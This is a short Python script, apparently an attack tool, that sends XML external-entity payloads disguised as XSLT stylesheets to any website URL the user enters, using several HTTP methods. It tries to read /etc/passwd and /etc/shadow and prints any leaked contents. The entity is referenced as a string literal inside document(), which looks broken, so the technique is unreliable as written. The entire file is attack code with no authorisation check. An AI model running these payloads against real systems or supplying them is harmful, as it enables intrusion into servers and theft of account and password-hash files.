import requests
from termcolor import colored

def test_xslt_vulnerability(url):
    methods = ['GET', 'POST', 'PUT', 'DELETE']
    payloads = [
        '''<?xml version="1.0"?>
        <!DOCTYPE xsl:stylesheet [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <html>
        <body>
        <h1>XSLT Injection Test</h1>
        <xsl:value-of select="document('xxe')"/>
        </body>
        </html>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <!DOCTYPE xsl:stylesheet [
        <!ENTITY xxe SYSTEM "file:///etc/shadow">
        ]>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <html>
        <body>
        <h1>XSLT Injection Test</h1>
        <xsl:value-of select="document('xxe')"/>
        </body>
        </html>
        </xsl:template>
        </xsl:stylesheet>'''
    ]

    for method in methods:
        for payload in payloads:
            headers = {'Content-Type': 'application/xml'}
            response = requests.request(method, url, data=payload, headers=headers)

            if "root:" in response.text:
                print(colored(f"The target website is vulnerable to XSLT injection using {method} method!", "green"))
                print("Sensitive information found in the response:")
                highlighted_response = response.text.replace("root:", colored("root:", "red"))
                print(highlighted_response)
                print("To test the vulnerability, visit the following URL:")
                print(colored(url, "blue"))
                return

    print(colored("The target website is not vulnerable to XSLT injection.", "red"))

if __name__ == "__main__":
    target_url = input("Enter your target website URL: ")
    print("Testing for XSLT vulnerability...")
    test_xslt_vulnerability(target_url)
